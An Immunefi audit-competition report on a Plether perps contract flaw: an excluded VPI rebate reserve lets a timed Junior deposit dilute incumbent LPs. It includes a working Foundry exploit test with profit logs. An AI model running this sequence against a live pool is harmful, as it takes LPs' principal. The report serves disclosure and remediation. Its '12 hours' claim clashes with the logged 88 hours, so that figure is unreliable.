# \#99526 [SC-Critical] VPI rebate reserve is left out of Junior NAV although its clawback is guaranteed, so an LP entry timed before the close takes the incumbents' principal

**Submitted on Nov 14th 2026 at 02:24:52 UTC by @Tradi3 for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99526
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

A skew-reducing open is paid a VPI rebate out of HousePool cash. The rebate is locked in the trader's VPI reserve, and the close or liquidation always returns it to the pool, because the lifetime clamp forbids net-negative lifetime VPI. So the pool holds a cash-backed receivable that is certain to come back, but LP NAV leaves it out. While such a position is open, Junior shares are priced below their value.

An attacker who controls a skew-reducing position and a Junior deposit opens the position just before the LP epoch boundary, lets the deposit activate at the understated NAV, and closes right after settlement. The clawback then lands in NAV, and the new shares take part of it from the LPs who funded the rebate.

Measured at release parameters on Forge 1.5.1, Junior 10M, Senior 39.9M, a standing 19M LONG from an unrelated trader, attacker deposit 30M, flat price:

- one cycle: the incumbent Junior LP ends **26,512.54 USDG** below the no-trade baseline and the attacker ends **+11,314.99 USDG** net of every fee;
- three cycles (about 12 hours, incumbent 12M): incumbent **-72,731.20 USDG (-0.60%)**, attacker **+27,136.66 USDG**.

The same mispricing underpays a redeeming LP: a victim redeeming 20M of Junior is paid **17,799.21 USDG** less when its redemption is funded inside that window.

With `vpiFactor = 0` and everything else identical, no rebate exists and nothing moves.

**Target:** `immunefi-team/audit-comp-plether` at `a82d4fefb02768e5b3bddcc97dee371eee24fea8`: `packages/perps/src/CfdEngineSettlementSidecar.sol`, `packages/perps/src/libraries/HousePoolAccountingLib.sol`, `packages/perps/src/libraries/CloseAccountingLib.sol`, `packages/perps/src/MarginClearinghouse.sol`

## Vulnerability Details

### The rebate leaves the pool at open

A skew-reducing open has negative trade cost. The settlement pays it from pool cash to the Clearinghouse (`CfdEngineSettlementSidecar.sol:442-444`):

```solidity
if (delta.poolRebatePayoutAssets > 0) {
    IHousePool(host.pool()).payOut(host.clearinghouse(), delta.poolRebatePayoutAssets);
}
```

and locks it in the account's dedicated reserve (`:466-478`, `clearinghouse.lockVpiRebateReserve`). The reserve target is `max(-vpiAccrued, 0)`. The trader cannot withdraw it or spend it on anything else.

### The close always returns it

`CloseAccountingLib.sol:116-118` clamps close VPI so lifetime VPI can never be negative:

```solidity
if (state.proportionalAccrualAssets + state.vpiDeltaAssets < 0) {
    state.vpiDeltaAssets = -state.proportionalAccrualAssets;
}
```

A position that received a rebate `R` at open therefore pays at least `R` back when it closes. The settlement moves the reserve to the pool (`CfdEngineSettlementSidecar.sol:690-693`, `MarginClearinghouse.consumeVpiRebateReserve` at `MarginClearinghouse.sol:884-906`). Liquidation does the same (`:801-803`). There is no path on which the pool does not get `R` back.

### NAV leaves the receivable out

LP NAV is physical pool assets plus the terminal price delta minus trader claims (`HousePoolAccountingLib.sol:60-78`). The locked reserve sits in the Clearinghouse and is in none of those terms. From the open until the close, NAV is lower than the pool's value by `R`, for every skew-reducing position that is open.

Deposits and redemptions are priced on that NAV at settlement:

- A Junior deposit activated in the window is minted shares at the understated price. When the position closes, `R` returns as pool revenue and the new shares receive `s × R`, where `s` is their share of Junior. The incumbents paid all of `R` at the open and get back only `(1 − s) × R`.
- A Junior redemption funded in the window is paid at the understated price. The redeemer's share of `R` stays with the LPs who remain.

### The attacker controls the window

All calls are permissionless.

1. Other traders hold a standing net position (here a 19M LONG, inside the 40% skew cap).
2. The attacker requests a Junior deposit before the epoch cutoff.
3. About 30 seconds before the epoch boundary, a second attacker account opens a SHORT of the same size. It reduces skew, so the pool pays it a rebate of 36,146.50 USDG, locked in its reserve. Pool cash falls by exactly that amount.
4. After the boundary the attacker calls `router.settleLpEpoch`. The deposit activates at NAV understated by the rebate.
5. The attacker closes the SHORT. The reserve returns to the pool and NAV rises by the rebate.
6. After the one-hour cooldown the attacker redeems. One cycle takes about four hours and can be repeated while the standing skew remains.

The attacker's trading account nets zero VPI (rebate in, clawback out) and pays only the 4 bps execution fee on each leg plus one minute of carry.

## Impact Details

Incumbent Junior LPs lose principal to the attacker. All figures are USDG at release parameters (`vpiFactor` 0.01e18, `maxSkewRatio` 0.4e18, execution fee 4 bps, Senior cap 40M and 80%), flat price, same snapshot in every arm.

**Entry, one cycle (incumbent Junior 10M, Senior 39.9M, attacker deposit 30M)**

| Arm | Attacker (LP + trading account) | Incumbent Junior | Senior | Treasury |
|---|---|---|---|---|
| C: no attacker trade | 31,999,453.89 | 10,034,999.70 | 39,902,186.94 | 7,599.81 |
| B: same trade, opened after settlement | 31,984,014.51 | 10,035,238.86 | 39,902,186.94 | 22,799.81 |
| A: opened before settlement | 32,010,768.88 | 10,008,487.16 | 39,902,186.94 | 22,799.81 |
| **A − C** | **+11,314.99** | **−26,512.54** | 0 | +15,200.00 |

Arm B is the same trade and the same deposit with only the order changed: the attacker loses its fees and the incumbent is not hurt. The standing trader's balance is identical in all three arms.

**Other executed cases**

| Case | Incumbent or victim | Attacker, net of all costs |
|---|---|---|
| Entry, equal stakes (10M each), one cycle | −17,357.70 | +2,159.24 |
| Entry, three cycles (incumbent 12M, attacker 30M) | −72,731.20 (−0.60%) | +27,136.66 |
| Exit: victim redeems 20M of a 40M Junior tranche | −17,799.21 | +2,596.87 |
| Entry with `vpiFactor = 0` | +593.79 | −15,794.04 |
| Exit with `vpiFactor = 0` | +237.49 | −15,437.73 |

Each cycle moves `s × R` from the incumbents, where `R` is the rebate (36,146.50 USDG here, about 7.2 bps of pool depth, for a position of 38% of depth against a 40% cap). The attacker's capital is an ordinary Junior deposit that is returned in full each cycle.

The tested profit needs standing skew near the cap and an attacker stake at least equal to the incumbent Junior. With a smaller stake or less skew the incumbents still lose `s × R`, but the attacker's fees exceed its gain. The same mispricing also applies with no attacker trade at all: any deposit activated while other traders' rebate reserves are outstanding receives part of their clawback, and any redemption funded then forfeits its share.

Severity: Critical, direct theft of user funds. The incumbent LPs' principal ends below the no-trade baseline and the attacker withdraws the difference.

## Relation to the positive-VPI report (#97621)

#97621 reports the positive side: VPI paid by a skew-increasing open is counted in NAV although the close can refund it, so an LP exit before the close leaves the remaining LPs funding the rebate. This report is the negative side: a rebate the pool has already paid, and is certain to get back, is left out of NAV, so an LP entry before the close takes it from the incumbents. The code paths differ (the open-time pool payout and the Clearinghouse reserve, rather than open-time revenue), and the fix proposed in #97621, deferring positive VPI the way the negative reserve is handled today, does not change this path.

## Recommendation

Count the outstanding rebate reserve as an LP receivable when pricing deposits and redemptions: add the aggregate `max(-vpiAccrued, 0)` across open positions to the distributable assets in the reconcile snapshot. It is fully cash-backed in the Clearinghouse and the clamp guarantees its return, so including it does not let LPs withdraw unbacked value: withdrawal capacity is computed separately from physical cash. Alternatively, keep the rebate inside the pool as a segregated balance until the position closes, instead of paying it out at open.

## References

- `packages/perps/src/CfdEngineSettlementSidecar.sol:442-444`: open-time rebate paid from pool cash
- `packages/perps/src/CfdEngineSettlementSidecar.sol:466-478`: rebate locked in the VPI reserve
- `packages/perps/src/CfdEngineSettlementSidecar.sol:690-693`, `:801-803`: reserve consumed to the pool on close and liquidation
- `packages/perps/src/libraries/CloseAccountingLib.sol:112-118`: lifetime clamp, close VPI at least returns the rebate
- `packages/perps/src/libraries/HousePoolAccountingLib.sol:60-78`: NAV terms, which exclude the reserve
- `packages/perps/SECURITY.md:866-872`, `packages/perps/WHITEPAPER.md:872-888`, `packages/perps/ACCOUNTING_SPEC.md:1064-1066`: the reserve is described as excluded from NAV so that LPs cannot withdraw it early; none of these lines says who receives the clawback when the LP set changes between open and close

## Proof of Concept

## Steps

1. Clone `immunefi-team/audit-comp-plether` at `a82d4fefb02768e5b3bddcc97dee371eee24fea8`.
2. Save the file below as `packages/perps/test/perps/VpiReserveLpTiming.t.sol`. It extends the repository's own `BasePerpTest`, sets the release RiskParams and the release Senior cap and share, and uses the production Engine, Pool, vaults, Clearinghouse and Router. Only Pyth and USDG are mocks. No in-scope file is changed.
3. Run with Forge 1.5.1 from the repository root:

```bash
forge test --root packages/perps --match-path test/perps/VpiReserveLpTiming.t.sol -vv
```

What each test does (every arm starts from one `vm.snapshotState`):
1. Junior and Senior LPs deposit through real async epochs. An unrelated trader opens a 19M LONG at 1.00 through `router.commitOrder` and `router.executeOrder`. This is the standing skew.
2. Entry tests: the attacker requests a Junior deposit. Thirty seconds before the epoch boundary its second account opens a 19M SHORT, which reduces skew and is paid the rebate from pool cash into its VPI reserve. After the boundary `router.settleLpEpoch` activates the deposit, the SHORT is closed, and after the one-hour cooldown the attacker redeems everything.
3. Exit test: a victim holding 20M of a 40M Junior tranche requests a full redemption. The attacker opens the SHORT thirty seconds before the boundary, settlement funds the victim, and the SHORT is closed.
4. Arm C runs the same sequence with no attacker trade. Arm B runs the same trade opened after settlement instead of before it. Arm A is the attack.
5. `VpiReserveLpTimingZeroVpiControl` reruns the entry and exit sequences with only `vpiFactor` set to 0.

Values are USDG atoms (6 decimals). In each log block the arms are printed in the order C, B, A.

## Test file

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "./BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {console2} from "forge-std/console2.sol";

/// @dev A skew-reducing open is paid a VPI rebate out of HousePool cash. The rebate is locked in the trader's
///      dedicated VPI reserve and the close (or liquidation) always returns it: the lifetime clamp in
///      CloseAccountingLib forbids net-negative lifetime VPI. The pool therefore holds a guaranteed receivable, but LP
///      NAV excludes it. While such a position is open, Junior shares are priced below their value:
///        - a Junior deposit activated in that window receives too many shares and takes part of the clawback from
///          the LPs who funded the rebate (entry arm);
///        - a Junior redemption funded in that window is paid too little and the remaining LPs keep the difference
///          (exit arm).
///      The same actor controls the window: it opens the skew-reducing position just before the LP epoch boundary and
///      closes it right after settlement.
///
///      RiskParams, executionFeeBps and the Senior cap/share match the release values. Production Engine, Pool,
///      vaults, Clearinghouse and Router are used through the repository fixture. Pyth and USDG are mocks.
abstract contract VpiReserveLpTimingBase is BasePerpTest {
    address internal constant SENIOR = address(0xB001);
    address internal constant HONEST = address(0xB002); // incumbent Junior LP (entry arm)
    address internal constant ATTACKER_LP = address(0xB003);
    address internal constant ATTACKER_TRADER = address(0xB004);
    address internal constant ORGANIC = address(0xB005); // unrelated trader whose LONG is the standing skew
    address internal constant VICTIM = address(0xB006); // incumbent Junior LP that redeems (exit arm)

    uint256 internal constant SIZE = 19_000_000e18; // 19M USDG notional at 1.00, inside the 40% skew cap
    uint256 internal constant TRADER_FUNDS = 2_000_000e6;
    uint256 internal constant TRADER_MARGIN = 500_000e6;

    /// @dev Same confidence input as the #97621 PoC: 1 bp of basket confidence at the release multiplier.
    uint64 internal constant FEED_CONFIDENCE = 12_500;

    enum Mode {
        NoTrade,
        OpenBeforeSettle,
        OpenAfterSettle
    }

    struct Outcome {
        uint256 attackerWealth; // attacker LP proceeds + attacker trading account
        uint256 otherLp; // HONEST (entry arm) or VICTIM (exit arm)
        uint256 seniorValue;
        uint256 treasury;
        uint256 organic;
        uint256 rebateLocked; // VPI reserve held by the attacker's position while open
        uint256 poolCashPaidAtOpen;
    }

    function _vpiFactor() internal pure virtual returns (uint256) {
        return 0.01e18;
    }

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: _vpiFactor(),
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _priceData() internal returns (bytes[] memory data) {
        data = _mockPythUpdateData(1e8);
        uint256 publishTime = _mockHistoricalPublishTime();
        baseMockPyth.setAllUniquePrices(
            _basePythFeedIds(), int64(100_000_000), FEED_CONFIDENCE, int32(-8), publishTime, publishTime - 1
        );
    }

    function _trade(address trader, CfdTypes.Side side, uint256 margin, bool isClose) internal {
        uint64 id = router.nextCommitId();
        vm.prank(trader);
        router.commitOrder(side, SIZE, margin, 0, isClose);
        router.executeOrder(id, _priceData());
        (uint256 size,,,,,,) = engine.positions(trader);
        assertEq(size, isClose ? 0 : SIZE, "order must fill");
    }

    function _settle() internal {
        router.settleLpEpoch(_priceData());
    }

    /// @dev Start each scenario one minute after an LP epoch boundary so every request has a full epoch ahead.
    function _alignAfterBoundary() internal {
        uint256 t = (vm.getBlockTimestamp() / 1 hours + 1) * 1 hours + 60;
        vm.warp(t);
        assertEq(vm.getBlockTimestamp(), t, "aligned");
    }

    function _organicSkew() internal {
        _fundTrader(ORGANIC, TRADER_FUNDS);
        _fundTrader(ATTACKER_TRADER, TRADER_FUNDS);
        _trade(ORGANIC, CfdTypes.Side.LONG, TRADER_MARGIN, false);
    }

    /// @dev The attacker's skew-reducing SHORT. Records the rebate locked in its reserve and the pool cash paid out.
    function _attackOpen(Outcome memory o) internal {
        uint256 poolBefore = pool.totalAssets();
        _trade(ATTACKER_TRADER, CfdTypes.Side.SHORT, TRADER_MARGIN, false);
        o.rebateLocked = clearinghouse.vpiRebateReserveAssets(ATTACKER_TRADER);
        uint256 poolAfter = pool.totalAssets();
        o.poolCashPaidAtOpen = poolBefore > poolAfter ? poolBefore - poolAfter : 0;
    }

    function _attackClose() internal {
        _trade(ATTACKER_TRADER, CfdTypes.Side.SHORT, 0, true);
        assertEq(clearinghouse.vpiRebateReserveAssets(ATTACKER_TRADER), 0, "reserve returned on close");
    }

    function _redeemAll(address lp) internal returns (uint256 redeemed) {
        uint256 shares = juniorVault.balanceOf(lp);
        vm.prank(lp);
        uint256 requestId = juniorVault.requestRedeem(shares, lp, lp);
        vm.warp(pool.lpEpochStart(requestId) + 5);
        _settle();
        redeemed = _claimRedeem(lp, requestId);
    }

    function _claimRedeem(address lp, uint256 requestId) internal returns (uint256 redeemed) {
        uint256 claimable = juniorVault.claimableRedeemRequest(requestId, lp);
        assertGt(claimable, 0, "exit must be funded");
        vm.prank(lp);
        redeemed = juniorVault.claimRedeem(requestId, claimable, lp, lp);
        assertEq(juniorVault.pendingRedeemRequest(requestId, lp), 0, "exit fully funded");
    }

    function _finish(Outcome memory o, address other, uint256 otherRealised) internal view {
        o.attackerWealth += clearinghouse.balanceAssets(ATTACKER_TRADER);
        o.otherLp = otherRealised + juniorVault.convertToAssets(juniorVault.balanceOf(other));
        o.seniorValue = seniorVault.convertToAssets(seniorVault.balanceOf(SENIOR));
        o.treasury = clearinghouse.balanceAssets(engine.protocolTreasury());
        o.organic = clearinghouse.balanceAssets(ORGANIC);
    }

    // ---------------------------------------------------------------------------------------------------------------
    // Entry arm: the attacker's Junior deposit activates while its skew-reducing position holds the rebate.
    // ---------------------------------------------------------------------------------------------------------------

    function _runEntry(Mode mode, uint256 honestStake, uint256 seniorStake, uint256 attackerStake, uint256 cycles)
        internal
        returns (Outcome memory o)
    {
        _setSeniorCapacity(40_000_000e6, 8000);
        _fundJunior(HONEST, honestStake);
        _fundSenior(SENIOR, seniorStake);
        vm.warp(vm.getBlockTimestamp() + 2 hours);
        _organicSkew();
        settlementToken.mint(ATTACKER_LP, attackerStake);

        uint256 lpCash = attackerStake;
        for (uint256 i; i < cycles; ++i) {
            lpCash = _entryCycle(mode, lpCash, o);
        }
        o.attackerWealth = lpCash;
        _finish(o, HONEST, 0);
    }

    /// @dev One cycle: deposit request, activation at the next boundary, exit after the one-hour cooldown.
    function _entryCycle(Mode mode, uint256 stake, Outcome memory o) internal returns (uint256 redeemed) {
        _alignAfterBoundary();
        // Deposit requests need a fresh mark while positions are open; anyone can refresh it.
        router.updateMarkPrice(_priceData());

        vm.startPrank(ATTACKER_LP);
        settlementToken.approve(address(juniorVault), stake);
        uint256 depositId = juniorVault.requestDeposit(stake, ATTACKER_LP, ATTACKER_LP);
        vm.stopPrank();
        uint256 start = juniorVault.depositEpochStart(depositId);

        vm.warp(start - 30);
        assertEq(vm.getBlockTimestamp(), start - 30, "time before boundary");
        if (mode == Mode.OpenBeforeSettle) {
            _attackOpen(o);
        }
        vm.warp(start + 5);
        assertEq(vm.getBlockTimestamp(), start + 5, "time after boundary");
        _settle();
        if (mode == Mode.OpenAfterSettle) {
            _attackOpen(o);
        }
        if (mode != Mode.NoTrade) {
            _attackClose();
        }

        uint256 claimable = juniorVault.claimableDepositRequest(depositId, ATTACKER_LP);
        assertEq(claimable, stake, "deposit activated in full");
        vm.prank(ATTACKER_LP);
        juniorVault.claimDeposit(depositId, claimable, ATTACKER_LP, ATTACKER_LP);

        vm.warp(vm.getBlockTimestamp() + 1 hours + 1);
        redeemed = _redeemAll(ATTACKER_LP);
    }

    function _entryArms(uint256 honestStake, uint256 seniorStake, uint256 attackerStake, uint256 cycles)
        internal
        returns (Outcome memory none, Outcome memory attack, Outcome memory control)
    {
        uint256 snapshot = vm.snapshotState();
        uint256 startedAt = vm.getBlockTimestamp();
        none = _runEntry(Mode.NoTrade, honestStake, seniorStake, attackerStake, cycles);
        console2.log("cycles / elapsed hours", cycles, (vm.getBlockTimestamp() - startedAt) / 1 hours);
        vm.revertToState(snapshot);
        attack = _runEntry(Mode.OpenBeforeSettle, honestStake, seniorStake, attackerStake, cycles);
        vm.revertToState(snapshot);
        control = _runEntry(Mode.OpenAfterSettle, honestStake, seniorStake, attackerStake, cycles);
        _report("incumbent Junior", none, attack, control);
    }

    // ---------------------------------------------------------------------------------------------------------------
    // Exit arm: a victim's Junior redemption is funded while the attacker's position holds the rebate.
    // ---------------------------------------------------------------------------------------------------------------

    function _runExit(Mode mode, uint256 victimStake, uint256 attackerStake, uint256 seniorStake)
        internal
        returns (Outcome memory o)
    {
        _setSeniorCapacity(40_000_000e6, 8000);
        _fundJunior(VICTIM, victimStake);
        _fundJunior(ATTACKER_LP, attackerStake);
        _fundSenior(SENIOR, seniorStake);
        vm.warp(vm.getBlockTimestamp() + 2 hours);
        _organicSkew();
        _alignAfterBoundary();

        uint256 victimShares = juniorVault.balanceOf(VICTIM);
        vm.prank(VICTIM);
        uint256 requestId = juniorVault.requestRedeem(victimShares, VICTIM, VICTIM);
        uint256 start = pool.lpEpochStart(requestId);

        vm.warp(start - 30);
        assertEq(vm.getBlockTimestamp(), start - 30, "time before boundary");
        if (mode == Mode.OpenBeforeSettle) {
            _attackOpen(o);
        }
        vm.warp(start + 5);
        assertEq(vm.getBlockTimestamp(), start + 5, "time after boundary");
        _settle();
        if (mode == Mode.OpenAfterSettle) {
            _attackOpen(o);
        }
        if (mode != Mode.NoTrade) {
            _attackClose();
        }
        uint256 victimOut = _claimRedeem(VICTIM, requestId);

        // The attacker's LP realises a tenth of its stake at the next epoch, which also reconciles NAV.
        uint256 tenth = juniorVault.balanceOf(ATTACKER_LP) / 10;
        vm.prank(ATTACKER_LP);
        uint256 lpRequest = juniorVault.requestRedeem(tenth, ATTACKER_LP, ATTACKER_LP);
        vm.warp(pool.lpEpochStart(lpRequest) + 5);
        _settle();
        o.attackerWealth = _claimRedeem(ATTACKER_LP, lpRequest)
            + juniorVault.convertToAssets(juniorVault.balanceOf(ATTACKER_LP));
        _finish(o, VICTIM, victimOut);
    }

    function _exitArms(uint256 victimStake, uint256 attackerStake, uint256 seniorStake)
        internal
        returns (Outcome memory none, Outcome memory attack, Outcome memory control)
    {
        uint256 snapshot = vm.snapshotState();
        none = _runExit(Mode.NoTrade, victimStake, attackerStake, seniorStake);
        vm.revertToState(snapshot);
        attack = _runExit(Mode.OpenBeforeSettle, victimStake, attackerStake, seniorStake);
        vm.revertToState(snapshot);
        control = _runExit(Mode.OpenAfterSettle, victimStake, attackerStake, seniorStake);
        _report("redeeming Junior", none, attack, control);
    }

    function _report(string memory other, Outcome memory none, Outcome memory attack, Outcome memory control)
        internal
        pure
    {
        _log("Arm C no attacker trade", other, none);
        _log("Arm B open after settlement (control)", other, control);
        _log("Arm A open before settlement (attack)", other, attack);
        console2.log("rebate locked in the attacker's VPI reserve", attack.rebateLocked);
        console2.log("pool cash paid out at the attacker's open  ", attack.poolCashPaidAtOpen);
        console2.log("A-C attacker", int256(attack.attackerWealth) - int256(none.attackerWealth));
        console2.log("A-C other LP", int256(attack.otherLp) - int256(none.otherLp));
        console2.log("A-C senior  ", int256(attack.seniorValue) - int256(none.seniorValue));
        console2.log("A-C treasury", int256(attack.treasury) - int256(none.treasury));
        console2.log("A-C organic ", int256(attack.organic) - int256(none.organic));
        console2.log("A-B attacker", int256(attack.attackerWealth) - int256(control.attackerWealth));
        console2.log("A-B other LP", int256(attack.otherLp) - int256(control.otherLp));
    }

    function _log(string memory label, string memory other, Outcome memory o) internal pure {
        console2.log(label);
        console2.log("  attacker (LP + trading account)", o.attackerWealth);
        console2.log(string.concat("  ", other), o.otherLp);
        console2.log("  senior  ", o.seniorValue);
        console2.log("  treasury", o.treasury);
        console2.log("  organic trader", o.organic);
    }
}

contract VpiReserveLpTimingTest is VpiReserveLpTimingBase {
    /// @dev Release caps: Junior 10M, Senior 39.9M. The attacker deposits 30M of Junior.
    function test_Entry_AttackerTakesIncumbentsClawback() public {
        (Outcome memory none, Outcome memory attack, Outcome memory control) =
            _entryArms(10_000_000e6, 39_900_000e6, 30_000_000e6, 1);
        assertGt(attack.rebateLocked, 30_000e6, "rebate locked while the position is open");
        assertGt(attack.attackerWealth, none.attackerWealth, "attacker profits net of every cost");
        assertLt(attack.otherLp, none.otherLp, "incumbent Junior ends below the no-trade baseline");
        assertGt(attack.attackerWealth, control.attackerWealth, "ordering is what pays");
        assertLt(attack.otherLp, control.otherLp, "ordering is what costs the incumbent");
        assertGe(control.otherLp, none.otherLp, "the same trade after activation does not hurt the incumbent");
    }

    /// @dev Equal stakes: the incumbent still loses; the attacker's margin is thinner.
    function test_Entry_EqualStake() public {
        (Outcome memory none, Outcome memory attack, Outcome memory control) =
            _entryArms(10_000_000e6, 39_900_000e6, 10_000_000e6, 1);
        assertLt(attack.otherLp, none.otherLp, "incumbent Junior ends below the no-trade baseline");
        assertLt(attack.otherLp, control.otherLp, "ordering is what costs the incumbent");
    }

    /// @dev The same entry repeated for three consecutive cycles against the same standing skew. The incumbent holds
    ///      12M here so its shrinking stake stays above the Senior-share floor and every attacker exit is funded in full.
    function test_Entry_ThreeCycles() public {
        (Outcome memory none, Outcome memory attack,) = _entryArms(12_000_000e6, 39_900_000e6, 30_000_000e6, 3);
        assertGt(attack.attackerWealth, none.attackerWealth + 20_000e6, "attacker profit accumulates");
        assertLt(attack.otherLp + 60_000e6, none.otherLp, "incumbent loss accumulates");
    }

    /// @dev A victim redeeming 20M of a 40M Junior tranche is funded while the reserve is outstanding.
    function test_Exit_RedeemerIsUnderpaid() public {
        (Outcome memory none, Outcome memory attack, Outcome memory control) =
            _exitArms(20_000_000e6, 20_000_000e6, 10_000_000e6);
        assertGt(attack.rebateLocked, 30_000e6, "rebate locked while the position is open");
        assertLt(attack.otherLp, none.otherLp, "redeemer is paid less than the no-trade baseline");
        assertLt(attack.otherLp, control.otherLp, "ordering is what costs the redeemer");
        assertGt(attack.attackerWealth, none.attackerWealth, "attacker profits net of every cost");
        assertGt(attack.attackerWealth, control.attackerWealth, "ordering is what pays");
    }
}

/// @dev Control on the claimed cause: identical stack and sequence, with only vpiFactor set to 0.
contract VpiReserveLpTimingZeroVpiControl is VpiReserveLpTimingBase {
    function _vpiFactor() internal pure override returns (uint256) {
        return 0;
    }

    function test_ZeroVpi_Entry_NoTransfer() public {
        (Outcome memory none, Outcome memory attack, Outcome memory control) =
            _entryArms(10_000_000e6, 39_900_000e6, 30_000_000e6, 1);
        assertEq(attack.rebateLocked, 0, "no rebate without VPI");
        assertLe(attack.attackerWealth, none.attackerWealth, "attacker only pays costs without VPI");
        assertGe(attack.otherLp, none.otherLp, "incumbent is not hurt without VPI");
        assertLe(attack.attackerWealth, control.attackerWealth + 1e6, "ordering pays nothing without VPI");
    }

    function test_ZeroVpi_Exit_NoTransfer() public {
        (Outcome memory none, Outcome memory attack,) = _exitArms(20_000_000e6, 20_000_000e6, 10_000_000e6);
        assertEq(attack.rebateLocked, 0, "no rebate without VPI");
        assertGe(attack.otherLp, none.otherLp, "redeemer is not hurt without VPI");
    }
}
```

## Output (Forge 1.5.1, run at the pin; the A-C and A-B lines of each test)

```text
Ran 2 tests for test/perps/VpiReserveLpTiming.t.sol:VpiReserveLpTimingZeroVpiControl
[PASS] test_ZeroVpi_Entry_NoTransfer() (gas: 26391239)
  rebate locked in the attacker's VPI reserve 0
  pool cash paid out at the attacker's open   0
  A-C attacker -15794044992
  A-C other LP 593785653
  A-C senior   0
  A-C treasury 15200000000
  A-C organic  0
[PASS] test_ZeroVpi_Exit_NoTransfer() (gas: 27854676)
  rebate locked in the attacker's VPI reserve 0
  pool cash paid out at the attacker's open   0
  A-C attacker -15437729687
  A-C other LP 237494067
  A-C senior   0
  A-C treasury 15200000000
  A-C organic  0
Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 75.70ms (130.44ms CPU time)
Ran 4 tests for test/perps/VpiReserveLpTiming.t.sol:VpiReserveLpTimingTest
[PASS] test_Entry_AttackerTakesIncumbentsClawback() (gas: 26623141)
  Arm C no attacker trade
    attacker (LP + trading account) 31999453885007
    incumbent Junior 10034999704493
    senior   39902186935307
    treasury 7599810000
    organic trader 1956230903569
  Arm B open after settlement (control)
    attacker (LP + trading account) 31984014506063
    incumbent Junior 10035238859538
    senior   39902186935307
    treasury 22799810000
    organic trader 1956230903569
  Arm A open before settlement (attack)
    attacker (LP + trading account) 32010768876567
    incumbent Junior 10008487162420
    senior   39902186935307
    treasury 22799810000
    organic trader 1956230903569
  rebate locked in the attacker's VPI reserve 36146504450
  pool cash paid out at the attacker's open   36146504450
  A-C attacker 11314991560
  A-C other LP -26512542073
  A-C senior   0
  A-C treasury 15200000000
  A-C organic  0
  A-B attacker 26754370504
  A-B other LP -26751697118
[PASS] test_Entry_EqualStake() (gas: 26622488)
  rebate locked in the attacker's VPI reserve 36146504450
  pool cash paid out at the attacker's open   36146504450
  A-C attacker 2159237977
  A-C other LP -17357703364
  A-C senior   0
  A-C treasury 15200000000
  A-C organic  0
  A-B attacker 17841374491
  A-B other LP -17839591721
[PASS] test_Entry_ThreeCycles() (gas: 49968269)
  cycles / elapsed hours 3 88
  rebate locked in the attacker's VPI reserve 34787293318
  pool cash paid out at the attacker's open   34787293318
  A-C attacker 27136657204
  A-C other LP -72731200312
  A-C senior   0
  A-C treasury 45600000000
  A-C organic  0
  A-B attacker 73556394307
  A-B other LP -73550269204
[PASS] test_Exit_RedeemerIsUnderpaid() (gas: 28094660)
  rebate locked in the attacker's VPI reserve 36074318735
  pool cash paid out at the attacker's open   36074318735
  A-C attacker 2596874440
  A-C other LP -17799214680
  A-C senior   0
  A-C treasury 15200000000
  A-C organic  0
  A-B attacker 17797127635
  A-B other LP -17799214680
Suite result: ok. 4 passed; 0 failed; 0 skipped; finished in 118.71ms (295.83ms CPU time)
Ran 2 test suites in 122.03ms (194.42ms CPU time): 6 tests passed, 0 failed, 0 skipped (6 total tests)
```
